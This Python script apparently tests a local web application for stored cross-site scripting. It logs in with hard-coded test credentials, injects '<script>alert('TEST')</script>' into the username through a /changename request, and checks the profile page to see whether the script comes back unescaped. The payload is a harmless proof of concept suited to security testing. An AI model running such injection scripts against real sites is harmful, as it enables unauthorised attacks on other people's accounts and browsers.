#!/usr/bin/env python3
"""
Manual XSS test to debug the issue
"""

import requests
import sys

BASE_URL = "http://localhost:5000"
TEST_USERNAME = "Jacksparrow"
TEST_PASSWORD = "princess"

def manual_xss_test():
    print("🔍 Manual XSS Test...")
    
    # Login
    session = requests.Session()
    session.get(f"{BASE_URL}/")
    
    login_data = {
        'username': TEST_USERNAME,
        'password': TEST_PASSWORD
    }
    
    login_response = session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False)
    print(f"Login status: {login_response.status_code}")
    
    if login_response.status_code not in [302, 303]:
        print("Login failed")
        return
    
    # Get userid from cookies
    userid = None
    for cookie in session.cookies:
        if cookie.name == 'userid':
            userid = cookie.value
            break
    
    print(f"User ID: {userid}")
    
    # Test simple script payload
    payload = "<script>alert('TEST')</script>"
    print(f"Injecting payload: {payload}")
    
    change_data = {
        'newname': payload,
        'userid': userid
    }
    
    response = session.get(f"{BASE_URL}/changename", params=change_data)
    print(f"Changename response: {response.status_code}")
    
    # Check profile page
    profile_response = session.get(f"{BASE_URL}/profile")
    print(f"Profile response: {profile_response.status_code}")
    
    print("\n--- Profile Page HTML ---")
    print(profile_response.text)
    print("--- End HTML ---\n")
    
    if payload in profile_response.text:
        print("✅ Payload found in profile page!")
    else:
        print("❌ Payload NOT found in profile page")
        
    # Also check for HTML escaped version
    escaped_payload = "&lt;script&gt;alert(&#39;TEST&#39;)&lt;/script&gt;"
    if escaped_payload in profile_response.text:
        print("⚠️  Payload is HTML escaped!")
    elif "<script>" in profile_response.text:
        print("✅ Script tag found unescaped!")
    else:
        print("❓ Script tag status unclear")

if __name__ == "__main__":
    manual_xss_test()
